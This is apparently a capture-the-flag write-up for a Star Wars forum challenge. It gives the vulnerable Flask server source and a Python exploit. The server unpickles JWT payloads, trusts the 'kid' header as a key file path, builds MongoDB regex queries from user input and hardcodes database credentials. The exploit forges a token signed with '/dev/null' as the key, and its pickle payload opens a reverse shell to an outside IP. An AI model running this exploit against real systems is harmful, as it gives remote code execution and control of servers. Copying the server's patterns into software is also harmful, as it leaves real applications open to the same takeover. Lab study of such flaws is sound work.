# B'omarr Style

## Description

Web forum about star wars.
Users can read papers.
Papers created by Admin.
Users are able to signup and signin.

After singin the got cookie `token`:
```
token=eyJ0eXAiOiAiSldUIiwgImFsZyI6ICJIUzI1NiIsICJraWQiOiAic2VjcmV0LnR4dCJ9.gANjbWFpbgpVc2VyCnEAKYFxAX1xAihYCAAAAHVzZXJuYW1lcQNYBAAAAGphY2txBFgEAAAAcm9sZXEFWAQAAAB1c2VycQZ1Yi4.SnQXObi662Qa84FJuMRoFePCCyxmdRHD9NiztjiBl_w
```

The JWT headers:
```
{"typ": "JWT", "alg": "HS256", "kid": "secret.txt"}
```

Body (python pickle serialization):
```
00000000  80 03 63 6d 61 69 6e 0a 55 73 65 72 0a 71 00 29  |..cmain.User.q.)|
00000010  81 71 01 7d 71 02 28 58 08 00 00 00 75 73 65 72  |.q.}q.(X....user|
00000020  6e 61 6d 65 71 03 58 04 00 00 00 6a 61 63 6b 71  |nameq.X....jackq|
00000030  04 58 04 00 00 00 72 6f 6c 65 71 05 58 04 00 00  |.X....roleq.X...|
00000040  00 75 73 65 72 71 06 75 62 2e                    |.userq.ub.|
```

Server's code (wasn't accessible until the exploit):

```python
from flask import (
    Flask,
    request,
    render_template,
    make_response,
    abort,
    redirect,
    url_for,
)
from pymongo import MongoClient
import hmac
import hashlib
import json
import base64
import pickle

app = Flask(__name__)

mongo = MongoClient(
    port=27017, username="user1", password="7Lp7rkJnw0xikG9V", authSource="blog"
)
db = mongo.blog


class User:
    def __init__(self, username, role):
        self.username = username
        self.role = role


@app.route("/login", methods=["POST", "GET"])
def login():
    if request.method == "POST":
        # Get username from formdata
        username = request.form["username"]
        password = request.form["password"]
        if not username:
            return render_template("login.html", error="A username must be provided")

        user = db.users.find_one({"username": username, "password": password})
        if not user:
            return render_template(
                "login.html", error="The username or password are incorrect"
            )
        user = User(user["username"], user["role"])
        token = create_token(pickle.dumps(user))
        # Redirect to index and set JWT in cookies
        resp = make_response(redirect(url_for("index")))
        resp.set_cookie("token", token)
        return resp

    elif request.method == "GET":
        return render_template("login.html")


@app.route("/signup", methods=["POST", "GET"])
def signup():
    if request.method == "POST":
        # Get username from formdata
        username = request.form["username"]
        password = request.form["password"]
        password2 = request.form["password2"]
        if not username or not password or not password2:
            return render_template(
                "signup.html", error="All the fields must be provided"
            )

        if password != password2:
            return render_template("signup.html", error="The passwords do not match")

        try:
            result = db.users.insert_one(
                {"username": username, "password": password, "role": "user"}
            )
        except Exception as e:
            return render_template("signup.html", error=e)

        # Redirect to login
        resp = make_response(redirect(url_for("login")))
        return resp

    elif request.method == "GET":
        return render_template("signup.html")


@app.route("/logout", methods=["GET"])
def logout():
    # Redirect to logout and delete JWT in cookies
    resp = make_response(redirect(url_for("login")))
    resp.delete_cookie("token")
    return resp


@app.route("/")
def index():
    user = None
    # Get jwt from cookie redirect to login if no jwt
    token = request.cookies.get("token", None)
    search = request.args.get("search", "")
    category = request.args.get("category", ".*")

    if token:
        try:
            user = verify_token(token)
        except Exception as e:
            abort(400, e)

    posts = db.posts.find(
        {
            "public": True,
            "title": {"$regex": search + ".*", "$options": "i"},
            "category": {"$regex": "^" + category + "$", "$options": "i"},
        }
    ).sort("order")

    return render_template("index.html", user=user, posts=posts)


@app.route("/post/<title>")
def post(title):
    user = None
    # Get jwt from cookie redirect to login if no jwt
    token = request.cookies.get("token", None)

    if token:
        try:
            user = verify_token(token)
        except Exception as e:
            abort(400, e)

    post = db.posts.find_one({"title": title})

    if not post:
        abort(404)

    return render_template("post.html", user=user, post=post)


def create_token(payload):
    with open("secret.txt", "rb") as file:
        key = file.read()
        header = {"typ": "JWT", "alg": "HS256", "kid": "secret.txt"}
        header_64 = (
            base64.urlsafe_b64encode(json.dumps(header).encode())
            .decode("UTF-8")
            .rstrip("=")
        )

        payload_64 = base64.urlsafe_b64encode(payload).decode("UTF-8").rstrip("=")

        sig_64 = (
            base64.urlsafe_b64encode(
                hmac.new(
                    key, (header_64 + "." + payload_64).encode(), hashlib.sha256
                ).digest()
            )
            .decode("UTF-8")
            .rstrip("=")
        )

        return header_64 + "." + payload_64 + "." + sig_64


def fix_padding(b64):
    b64 += "=" * (4 - (len(b64) % 4))
    return b64


def verify_token(token):
    header_64, payload_64, signature_64 = token.split(".")
    header = json.loads(base64.urlsafe_b64decode(fix_padding(header_64)))
    payload = base64.urlsafe_b64decode(fix_padding(payload_64))
    if header["alg"] != "HS256":
        raise Exception("The only JWT algorithm supported is HS256")
    with open(header["kid"], "rb") as file:
        key = file.read()
        check = (
            base64.urlsafe_b64encode(
                hmac.new(
                    key, (header_64 + "." + payload_64).encode(), hashlib.sha256
                ).digest()
            )
            .decode("UTF-8")
            .rstrip("=")
        )
        if signature_64 != check:
            raise Exception("The JWT signature is not valid")
        else:
            return pickle.loads(payload)
    raise Exception("Error verifying JWT")
```

## Exploit

```python
import os
import sys
import pickle
import binascii
from jose import jws

class exp(object):
    def __reduce__(self):
        s = """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("1.1.1.1",41337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'   """
        return (os.system, (s,))

e = exp()

key = open('/dev/null', 'rb').read()

shellcode = pickle.dumps(e)

print(jws.sign(shellcode, key, headers={"kid": "/dev/null"},algorithm='HS256'))

```